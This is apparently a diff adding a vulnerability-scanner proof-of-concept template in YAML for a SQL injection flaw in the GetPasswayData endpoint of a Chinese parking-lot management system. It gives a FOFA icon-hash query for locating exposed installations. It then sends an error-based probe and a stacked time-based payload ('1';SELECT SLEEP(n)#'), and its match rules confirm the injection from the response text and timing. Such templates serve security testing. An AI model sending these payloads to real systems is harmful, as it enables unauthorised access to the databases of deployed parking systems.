@@ -1,0 +1,28 @@
+id: poc-yaml-cxyun-getpasswaydata-sqli
+info:
+  name: 停车场后台管理系统 GetPasswayData SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 停车场后台管理系统
+  fofa: icon_hash="938984120"
+variables:
+  t1: random_int(5,10)
+  t2: t1 + 2
+requests:
+- method: POST
+  path: /LaneMonitor/GetPasswayData
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: SentryHost_No=1'
+  expression: "status_code == 200 && \ncontains(body,\"your SQL syntax\") &&\ncontains(body,\"\
+    \\\"success\\\":false\")\n"
+- method: POST
+  path: /LaneMonitor/GetPasswayData
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: SentryHost_No=1';SELECT+SLEEP({{.t1}})#
+  expression: "status_code == 200 && \ncontains(body,\"\\\"msg\\\":\\\"读取成功\\\"\"\
+    ) &&\ncontains(body,\"\\\"success\\\":true\") &&\nduration > t1 &&\nduration <\
+    \ t2\n"
+transport: http
